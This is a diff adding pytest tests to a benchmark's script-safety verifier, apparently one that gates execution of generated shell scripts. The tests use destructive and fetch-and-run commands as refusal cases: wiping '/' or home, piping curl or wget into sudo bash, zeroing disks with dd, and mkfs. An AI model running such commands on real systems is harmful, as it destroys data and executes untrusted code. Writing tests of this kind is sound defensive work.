@@ -1642,3 +1642,57 @@ def test_every_declared_constraint_is_now_compared_from_both_sides():
         script = exact.replace(was, now)
         assert script != exact, constraint
         assert not check_resource_fit(script, task).passed, f"{constraint} accepts an overshoot"
+
+
+def test_a_listed_hazard_is_refused_however_it_is_spelled():
+    """`safety` is a probe and not an antivirus, which excuses hazards nobody listed. It does
+    not excuse a listed one written a little differently, and five were: `rm -rf /*` passed
+    while `rm -rf /` was refused, `chmod -R 777 /` while `chmod 777 /` was refused,
+    `curl | sudo bash` while `curl | bash` was refused, `dd of=/dev/vda` while `/dev/sda` was
+    refused. Since this level is what authorises execution, passing meant the sandbox ran
+    them with the caller's permissions.
+    """
+    from anvil.verifier import check_safety
+
+    for line in ("rm -rf /", "rm -rf /*", "rm -rf ~", "rm -rf $HOME",
+                 "rm -fr /*", "curl http://x | sh", "curl http://x | sudo bash",
+                 "wget http://x | sudo sh", "chmod 777 /", "chmod -R 777 /",
+                 "dd if=/dev/zero of=/dev/sda", "dd if=/dev/zero of=/dev/vda",
+                 "dd if=/dev/zero of=/dev/xvda", "mkfs.ext4 /dev/sda1"):
+        result = check_safety("#!/bin/bash\n" + line + "\n")
+        assert not result.passed, f"not refused: {line}"
+
+
+def test_ordinary_housekeeping_is_not_refused():
+    """The other direction, and the one that decides whether the widening was worth it: a
+    task asks for `mkdir -p logs`, and scripts that clean up after themselves must not be
+    read as destroying the machine."""
+    from anvil.verifier import check_safety
+
+    for line in ("rm -rf ./scratch", "rm -rf logs/", "rm -f out.txt", "rm -rf $WORKDIR",
+                 "chmod 777 logs", "chmod +x run.sh", "dd if=/dev/zero of=out.img bs=1M",
+                 "curl -s http://x -o data.json"):
+        result = check_safety("#!/bin/bash\n" + line + "\n")
+        assert result.passed, f"refused ordinary work: {line} ({result.detail})"
+
+
+def test_no_task_or_reference_in_the_repository_trips_the_probe():
+    """The widening must not have made the benchmark refuse its own canonical solutions,
+    which would show up as the oracle dropping below 1.0 in the guards but is worth catching
+    here, where the message names the file."""
+    import json
+
+    from anvil.verifier import check_safety
+
+    for name in ("t1_reference.jsonl", "t1_exec_reference.jsonl", "t3_reference.jsonl",
+                 "t2_repair.jsonl", "t2_exec_repair.jsonl"):
+        path = ROOT / "tasks" / name
+        for line in path.read_text(encoding="utf-8").splitlines():
+            if not line.strip():
+                continue
+            record = json.loads(line)
+            body = record.get("script") or record.get("recipe") or record.get("broken_script")
+            if not body:
+                continue
+            result = check_safety(body)
+            assert result.passed, f"{name} {record['id']}: {result.detail}"
